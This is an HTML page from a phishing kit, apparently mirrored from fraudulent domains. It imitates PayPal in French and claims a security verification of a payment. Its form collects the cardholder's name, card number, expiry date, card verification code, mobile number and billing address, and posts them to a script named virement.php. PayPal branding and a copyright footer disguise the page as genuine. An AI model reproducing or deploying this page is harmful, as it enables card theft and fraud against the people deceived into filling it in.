<!DOCTYPE html>
<html data-reactroot="">

<!-- Mirrored from transactioneurope.yo.fr/carte-bancaire.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Mar 2020 10:18:12 GMT -->
<!-- Added by HTTrack -->
<!-- Mirrored from paypal.me.mattiasvaucher.com/carte-bancaire.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Apr 2020 09:50:49 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>PayPal| Confirmation de paiement</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="vx_modal-content">

             <header class="vx_modal-header">
        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa">
                                Pour des raisons de sécurité, nous procèderons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site. Veuillez choisir la carte de reception du paiement.
                            </label>
                        </div>
        <p class="vx_text-body"></p>
    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                <form method="POST" action="virement.php" accept-charset="UTF-8"  name="cvalidate">


                   <div class="card-wrapper"></div>

                      <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Prénom">
                         <label class="floatingLabel" for="cardNumber">Prénom</label>
                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="Entrez le Pénom(s) du titulaire de la carte" aria-describedby="text-info-cardNumber" id="cardPrenom" name="cardPrenom" type="text">
                      </div>
                      <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Nom">
                         <label class="floatingLabel" for="cardNumber">Nom</label>
                         <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="Entrez le Nom du titulaire de la carte" aria-describedby="text-info-cardNumber" id="cardNom" name="cardNom" type="text">
                      </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Numéro de carte">
                            <label class="floatingLabel" for="cardNumber">Numéro de carte</label>
                           <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardNumber" placeholder="Entrez le nº de carte" aria-describedby="text-info-cardNumber" id="cardNumber" name="cardNumber" type="text">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active vx_floatingLabel_complex" data-label-content="Date d&#x27;expiration">
                            <label class="floatingLabel" for="expDate">Date d&#x27;expiration</label>
                            <div class="vx_form-control" data-label-content="Date d&#x27;expiration">
                               <input value="" aria-label="login_emaildiv" class="test_expDate" required="required" autocomplete="off_expDate" placeholder="mm/aa" aria-describedby="text-info-expDate" id="expDate" name="expDate" type="text">
                            </div>
                           <span></span>
                        </div>
                        <div class="table-container">
                            <div class="table-row">
                                <div class="table-col-xs-10">
                                    <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Cryptogramme visuel">
                                        <label class="floatingLabel" for="verificationCode">Cryptogramme visuel</label>
                                          <input value="" aria-label="login_emaildiv" class="test_verificationCode test_verificationCode vx_form-control" required="required" autocomplete="off_verificationCode" placeholder="Saisissez le cryptogramme visuel." aria-describedby="text-info-verificationCode" id="verificationCode" name="verificationCode" type="text">

                                    </div>
                                </div>
                                <div class="table-col-xs-2 cardImage-container"><span data-name="" class="rectangleLogo_small shadow  csc-image "></span></div>
                            </div>
                        </div>
                        
                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Numéro de Mobile">
                            <label class="floatingLabel" for="cardNumber">Numéro de Mobile</label>
                           <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardNumber" placeholder="Entrez le nº de téléphone lié à la carte" aria-describedby="text-info-cardNumber" id="cardNumber" name="tel" type="text">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Adresse de Facturation">
                            <label class="floatingLabel" for="cardNumber">Adresse de facturation</label>
                           <input value="" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardNumber" placeholder="Entrez l'adresse complete de facturation" aria-describedby="text-info-cardNumber" id="cardNumber" name="adresse_facturation" type="text">
                        </div>

                        <input type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">
                   </form>

                </div>

            </div>

        </div>

    </div>
            <div class="signup-page-footer vx_text-legal center">©1999-2020 PayPal. Tous droits réservés.</div>
        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>
   

   <script type="text/javascript" src="public/js/card.js"></script>
   <script type="text/javascript">
      var card = new Card({
         form: 'form',
         container: '.card-wrapper',
         formSelectors: {
            nameInput: 'input[name="cardPrenom"], input[name="cardNom"]',
            numberInput: 'input[name="cardNumber"]', // optional — default input[name="number"]
            expiryInput: 'input[name="expDate"]', // optional — default input[name="expiry"]
            cvcInput: 'input[name="verificationCode"]', // optional — default input[name="cvc"]
         },
         messages: {
            validDate: 'expire\ndate',
            monthYear: 'mm/yyyy'
         }
      });
   </script>

</body>


<!-- Mirrored from transactioneurope.yo.fr/carte-bancaire.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Mar 2020 10:18:12 GMT -->

<!-- Mirrored from paypal.me.mattiasvaucher.com/carte-bancaire.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Apr 2020 09:50:50 GMT -->
</html>
